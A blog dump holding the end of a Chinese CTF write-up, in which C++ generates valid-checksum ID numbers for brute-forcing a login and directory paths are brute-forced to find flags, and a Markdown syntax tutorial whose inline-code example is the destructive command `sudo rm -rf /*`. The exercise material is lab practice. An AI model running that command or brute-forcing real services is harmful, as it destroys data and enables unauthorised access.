&#125;;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum += list[i] * ID[i];</span><br><span class="line">&#125;</span><br><span class="line">sum = sum % <span class="number">11</span>;</span><br><span class="line"><span class="keyword">if</span> (src[sum] == ID[<span class="number">17</span>]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> id[<span class="number">18</span>] = &#123; <span class="number">6</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> y = <span class="number">1990</span>; y &lt; <span class="number">2024</span>; y++)</span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">6</span>] = y / <span class="number">1000</span>;</span><br><span class="line">id[<span class="number">7</span>] = y / <span class="number">100</span> % <span class="number">10</span>;</span><br><span class="line">id[<span class="number">8</span>] = y / <span class="number">10</span> % <span class="number">10</span>;</span><br><span class="line">id[<span class="number">9</span>] = y % <span class="number">10</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">1</span>; m &lt; <span class="number">13</span>; m++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m &lt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">id[<span class="number">11</span>] = m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">id[<span class="number">11</span>] = m % <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> d = <span class="number">1</span>; d &lt; <span class="number">31</span>; d++)</span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">12</span>] = d / <span class="number">10</span>;</span><br><span class="line">id[<span class="number">13</span>] = d % <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">checkCard</span>(id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line">cout &lt;&lt; id[i];</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可用数据大概有一千多条，抓包爆破找到反常长度的返回即可获得flag</p><h2 id="28-web28">28.web28</h2><h3 id="题目描述">题目描述</h3><p><strong>大海捞针</strong></p><h3 id="解题思路">解题思路</h3><p>进去发现毫无提示，真是大海捞针<br>不过既然原域名发生重定向到/0/1/2.txt，又属于爆破题（注意爆破时要将2.txt改为默认文件index.php）<br>可以想到BP抓包爆破域名<br>/0~100/0~100<br>爆破后在/72/10/index.php返回状态码200<br>拿到flag</p><hr>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更新日志&amp;md语法演示</title>
      <link href="/2023/07/09/demo/"/>
      <url>/2023/07/09/demo/</url>
      
        <content type="html"><![CDATA[<h2 id="更新日记">更新日记</h2><p>TodoList:</p><ul><li>[x] 搜索功能</li><li>[x] 添加数学公式编辑器</li><li>[x] 评论功能</li><li>[ ] 基于双线部署和CDN加速</li><li>[ ] 页面美化（长期）</li></ul><h2 id="md语法演示">md语法演示</h2><h3 id="1-标题-数个-空格-前置">1. 标题 [数个 “#” + 空格 前置]</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 一级标题</span></span><br><span class="line"><span class="section">## 二级标题</span></span><br><span class="line"><span class="section">### 三级标题</span></span><br><span class="line"><span class="section">#### 四级标题</span></span><br><span class="line"><span class="section">##### 五级标题</span></span><br><span class="line"><span class="section">###### 六级标题</span></span><br></pre></td></tr></table></figure><p>标题会在目录与大纲分级显示, 可以跳转.<br>在 Typora 中建议开启 <code>严格模式</code>, 即不应为 <code>#标题</code>, 应为 <code># 标题</code>.<br>应该要手动补上空格, 使得 Markdown 语法在其他文本编辑器上兼容.</p><h3 id="2-强调-用-或-包围">2. 强调 [用 “**” 或 “__” 包围]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**欢迎报考吉林大学!** (我喜欢用这种)</span><br><span class="line">__欢迎报考吉林大学!__</span><br></pre></td></tr></table></figure><p>或者选中想要强调的文字按下 <code>Ctrl</code> + <code>B</code>.</p><p>E.G.</p><p><strong>欢迎报考吉林大学!</strong></p><h3 id="3-斜体-用-或-包围">3. 斜体 [用 “*” 或 “_” 包围]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*欢迎大佬来浇浇我各种知识* (我喜欢用这种)</span><br><span class="line">_欢迎大佬来浇浇我各种知识_</span><br></pre></td></tr></table></figure><p>或者选中想要强调的文字按下 <code>Ctrl</code> + <code>I</code>.</p><p>E.G.<br><em>欢迎大佬来浇浇我各种知识</em></p><h3 id="4-删除线-用-包围">4. 删除线 [用 “~~” 包围]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~我宣布个事儿, 我是Sabiyary!~~</span><br></pre></td></tr></table></figure><p>E.G.<br><s>我宣布个事儿, 我是Sabiyary!</s></p><h3 id="5-高亮-用-包围">5. *高亮 [用 “==” 包围]</h3><p><strong>(注意: 此为扩展语法)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">==我喜欢黄色, 也喜欢绿色==</span><br></pre></td></tr></table></figure><p>E.G.<br>==我喜欢黄色, 也喜欢绿色==</p><h3 id="6-单行代码-用-包围">6. 单行代码 [用 “`” 包围]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`sudo rm -rf /*`</span><br></pre></td></tr></table></figure><p>E.G.<br><code>sudo rm -rf /*</code> (没事别乱敲这个! )</p><p><s>“请输入管理员密码: (闪烁的光标)”</s></p><h3 id="7-代码块-按三个-并敲回车">7.代码块[按三个 “`” 并敲回车]</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="comment">// 这里就可以开始输入你要的代码了</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mian</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    print（“Hello, world!\n<span class="string">&quot;）;</span></span><br><span class="line"><span class="string">    retrun O;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">``` // (这三个&quot;</span>`<span class="string">&quot;文本编辑器会帮你自动补全 一般不用手动输)</span></span><br></pre></td></tr></table></figure><p>E.G.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-引用-空格-前置">8. 引用 [&quot;&gt;&quot; + 空格 前置]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 24岁, 是学生.</span><br><span class="line">&gt; &gt; 学生特有的无处不在(恼)</span><br></pre></td></tr></table></figure><p>引用是可以嵌套的!</p><p>E.G.</p><blockquote><p>18岁, 是学生.</p><blockquote><p>学生特有的无处不在(恼)</p></blockquote></blockquote><h3 id="9-无序列表-或-空格-前置">9. 无序列表 [&quot;-&quot; 或  “+” + 空格 前置]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 一颗是枣树 (我喜欢用这种)</span><br><span class="line">+ 另一颗还是枣树</span><br><span class="line">* (其实这种也可以, 不过由于在 Typora 中很难单个输入, 故不常用)</span><br></pre></td></tr></table></figure><p>三种前置符都可以, 敲回车会自动补全, 可在 Typora 设置中调整补全的符号, 敲回车后按下 <code>Tab</code> 会缩进一级.<br>E.G.</p><ul><li>一颗是枣树</li><li>另一颗还是枣树</li></ul><h3 id="10-有序列表-数字-空格-前置">10. 有序列表 [数字 + “.” + 空格 前置]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我来这里就为了三件事:</span><br><span class="line">1. 公平</span><br><span class="line">2. 公平</span><br><span class="line">3. 还是tm的公平!</span><br></pre></td></tr></table></figure><p>敲回车会自动补全, 敲回车后按下 <code>Tab</code> 会缩进一级.</p><p>E.G.<br>我来这里就为了三件事:</p><ol><li>公平</li><li>公平</li><li>还是tm的公平!</li></ol><h3 id="11-上标-用-包围">11. *上标 [用 “^” 包围]</h3><p><strong>(注意: 此为扩展语法)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C语言中int的上限是 2^31^ - 1 = 2147483647</span><br></pre></td></tr></table></figure><p>E.G.</p><p>C语言中 <code>int</code> 的上限是 2^31^ - 1 = 2147483647</p><h3 id="12-下标-用-包围">12. *下标 [用 “~” 包围]</h3><p><strong>(注意: 此为扩展语法)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H~2~O 是剧毒的!</span><br></pre></td></tr></table></figure><p>E.G.</p><p>H~2~O 是剧毒的!</p><h3 id="13-注释-后置">13. *注释 [&quot;[^]&quot; 后置]</h3><p><strong>(注意: 此为扩展语法)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 今日我们相聚于此, 是为了学习 Markdown 的使用, 它的教程对于全体「观众」而言, 值得足足两个硬币的支持鼓励![^1]</span><br><span class="line"></span><br><span class="line">[^1]: 沃兹·基·硕德 改编自「公鸡」普契涅拉.</span><br></pre></td></tr></table></figure><p>需要在文末写上注释对应的内容</p><p>E.G.</p><blockquote><p>今日我们相聚于此, 是为了学习 Markdown 的使用, 它的教程对于全体「观众」而言, 值得足足两个硬币的支持鼓励![^1]</p></blockquote><p>[^1]: 沃兹·基·硕德 改编自「公鸡」普契涅拉.</p><h3 id="14-链接-常用-分别包围文本与链接">14. 链接 [常用 “[ ]” + “( )” 分别包围文本与链接]</h3><p><strong>(注意: 文内跳转为扩展用法)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[bilibili](https://www.bilibili.com/)</span><br></pre></td></tr></table></figure><p>支持网页链接与文内跳转, 按住 <code>Ctrl</code> 并 <code>单击鼠标左键</code> 即可跳转.</p><p>E.G.<br><a href="https://www.bilibili.com/">bilibili</a></p><h3 id="15-任务列表-空格-前置">15. 任务列表 [&quot;- [ ]&quot; + 空格 前置]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TodoList:</span><br><span class="line">- [ ] 刷B站</span><br><span class="line">- [ ] 写代码</span><br><span class="line">- [x] 起床</span><br></pre></td></tr></table></figure><p>用 <code>x</code> 代替 <code>[ ]</code> 中的空格来勾选任务列表. 在 Typora 中可以直接用鼠标左键单击勾选框.</p><p>E.G.<br>TodoList:</p><ul><li>[x] 刷B站</li><li>[ ] 写代码</li><li>[x] 起床</li></ul><h3 id="16-表格-用-绘制表格边框">16. 表格 [用 “|” 绘制表格边框]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| 学号 | 姓名  | 年龄 |</span><br><span class="line">| :--- | :---: | ---: | (引号的位置代表着 左对齐, 居中, 右对齐)</span><br><span class="line">|114514|田所|24|</span><br><span class="line">|1919810|浩三|25|</span><br></pre></td></tr></table></figure><p>第一行为表头, 并由第二行分割线决定对齐方式与长度, 第三行及之后即表格数据<br>E.G.</p><table><thead><tr><th style="text-align:left">学号</th><th style="text-align:center">姓名</th><th style="text-align:right">年龄</th></tr></thead><tbody><tr><td style="text-align:left">114514</td><td style="text-align:center">田所</td><td style="text-align:right">24</td></tr><tr><td style="text-align:left">1919810</td><td style="text-align:center">浩三</td><td style="text-align:right">25</td></tr></tbody></table><h3 id="17-图片">17.图片</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![图片](图片的位置)</span><br></pre></td></tr></table></figure><p>图片的位置使用图床url链接</p><p>E.G.<br><img src="https://img1.imgtp.com/2023/07/11/H0JIUly9.jpg" alt="AI绘图"></p><h3 id="18-分割线-按三个-或-或-并敲回车">18. 分割线 [按三个 “*” 或 “-” 或 “_” 并敲回车]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">***</span><br><span class="line">--- (我喜欢用这种)</span><br><span class="line">___</span><br><span class="line">// (其实按三个及以上都可以)</span><br></pre></td></tr></table></figure><p>由于 <code>*</code> 与 <code>_</code> 均会自动补全, 所以我觉得 <code>-</code> 最为方便.<br>E.G.</p><hr><hr><hr><h3 id="19-emoji表情-前置">19. Emoji表情 [&quot;:&quot; 前置]</h3><p><strong>(注意: 英文输入为扩展语法)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:sweat_smile: </span><br><span class="line">:drooling_face:</span><br><span class="line">:clown_face:</span><br><span class="line">// (敲回车或者鼠标点击, 后置的&quot;:&quot;一般不需要手动输)</span><br></pre></td></tr></table></figure><p>这个功能唯一的要求就是英语水平要高, 或者大概记得各个 Emoji 的英文名.</p><p>E.G.</p><p>:sweat_smile:<br>:drooling_face:<br>:clown_face:</p><p>对于其余普通的 Markdown 文本编辑器, 可以直接将 Emoji 表情复制进来, 这是直接<strong>硬编码</strong>的 (<s>刻进DNA里</s>)</p><p>E.G.</p><p>😅🤤🤡</p><p>用好这个功能可以让你的文本非常的可爱! <s>太抽象了</s><br>这里分享一个可以复制<a href="https://emojipedia.org/apple/">全Emoji的网站</a></p><h3 id="20-内联-html-代码-用-包围">20. 内联 HTML 代码 [用 “&lt;&gt; &lt;/&gt;” 包围]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">  &lt;font style=&quot;color:red&quot;&gt;我不会 HTML 呜呜呜... 浇浇我&lt;/font&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;简单的文字居中也可以这样&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">&lt;u&gt;我差点忘了还有下划线这东西...&lt;/u&gt;</span><br></pre></td></tr></table></figure><p>只要你会写, 你完全可以把 Markdown 当作 <strong>HTML</strong> 来写.</p><p>同时, <code>.md</code> 文件可以直接导出成一个网页.</p><p>下划线可以选中想要下划的文字按下 <code>Ctrl</code> + <code>U</code>.</p><p>E.G.</p><div style="text-align:center">  <font style="color:red">我不会 HTML 呜呜呜... 浇浇我</font></div><center>简单的文字居中也可以这样</center><p><u>我差点忘了还有下划线这东西…</u></p><h3 id="21-内联-latex-公式-用-包围">21. 内联 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>LaTeX</mtext></mrow><annotation encoding="application/x-tex">\LaTeX</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.89883em;vertical-align:-0.2155em;"></span><span class="mord text"><span class="mord textrm">L</span><span class="mspace" style="margin-right:-0.36em;"></span><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.68333em;"><span style="top:-2.904999em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord"><span class="mord textrm mtight sizing reset-size6 size3">A</span></span></span></span></span></span><span class="mspace" style="margin-right:-0.15em;"></span><span class="mord text"><span class="mord textrm">T</span><span class="mspace" style="margin-right:-0.1667em;"></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.46782999999999997em;"><span style="top:-2.7845em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord textrm">E</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2155em;"><span></span></span></span></span><span class="mspace" style="margin-right:-0.125em;"></span><span class="mord textrm">X</span></span></span></span></span></span> 公式 [用 “$” 包围]</h3><p><strong>(注意: 部分编译器会不识别部分符号)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$\LaTeX$ 是最好用的论文排版语言! 不信你看!</span><br><span class="line"></span><br><span class="line">$a^n+b^n=c^n$</span><br><span class="line"></span><br><span class="line">$$\sqrt&#123;x&#125; + \sqrt&#123;x^&#123;2&#125;+\sqrt&#123;y&#125;&#125; = \sqrt[3]&#123;k_&#123;i&#125;&#125; - \frac&#123;x&#125;&#123;m&#125;$$</span><br></pre></td></tr></table></figure><p>用 <code>$</code> 包围为单条公式, 按下两个 <code>$</code> 并敲回车即生成公式块.</p><p>E.G.</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>LaTeX</mtext></mrow><annotation encoding="application/x-tex">\LaTeX</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.89883em;vertical-align:-0.2155em;"></span><span class="mord text"><span class="mord textrm">L</span><span class="mspace" style="margin-right:-0.36em;"></span><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.68333em;"><span style="top:-2.904999em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord"><span class="mord textrm mtight sizing reset-size6 size3">A</span></span></span></span></span></span><span class="mspace" style="margin-right:-0.15em;"></span><span class="mord text"><span class="mord textrm">T</span><span class="mspace" style="margin-right:-0.1667em;"></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.46782999999999997em;"><span style="top:-2.7845em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord textrm">E</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2155em;"><span></span></span></span></span><span class="mspace" style="margin-right:-0.125em;"></span><span class="mord textrm">X</span></span></span></span></span></span> 是最好用的论文排版语言! 不信你看!</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>n</mi></msup><mo>+</mo><msup><mi>b</mi><mi>n</mi></msup><mo>=</mo><msup><mi>c</mi><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">a^n+b^n=c^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.747722em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>x</mi></msqrt><mo>+</mo><msqrt><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msqrt><mi>y</mi></msqrt></mrow></msqrt><mo>=</mo><mroot><msub><mi>k</mi><mi>i</mi></msub><mn>3</mn></mroot><mo>−</mo><mfrac><mi>x</mi><mi>m</mi></mfrac></mrow><annotation encoding="application/x-tex">\sqrt{x} + \sqrt{x^{2}+\sqrt{y}} = \sqrt[3]{k_{i}} - \frac{x}{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.190845em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491550000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathdefault">x</span></span></span><span style="top:-2.809155em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.190845em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.57419em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.26581em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751935em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.711935em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.28806499999999996em;"><span></span></span></span></span></span></span></span><span style="top:-3.22581em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.57419em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.23390500000000003em;"></span><span class="mord sqrt"><span class="root"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.785534em;"><span style="top:-2.963314em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size6 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.006095em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.966095em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width='400em' height='1.28em' 